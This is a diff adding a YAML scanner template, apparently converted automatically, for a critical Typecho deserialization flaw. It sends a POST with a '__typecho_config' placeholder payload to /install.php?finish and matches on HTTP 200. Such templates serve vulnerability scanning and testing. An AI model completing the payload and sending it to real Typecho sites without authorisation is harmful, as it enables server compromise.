@@ -1,0 +1,22 @@
+id: yaml-poc-typecho-typecho-deserialization-CT-158880
+info:
+  name: Yaml Poc Typecho Typecho Deserialization Ct 158880
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-typecho-typecho-deserialization-CT-158880'
+  tags: deserialization
+  reference: []
+http:
+- method: POST
+  path:
+  - /install.php?finish
+  body: __typecho_config={{payload}}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Referer: '{{referer}}'
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
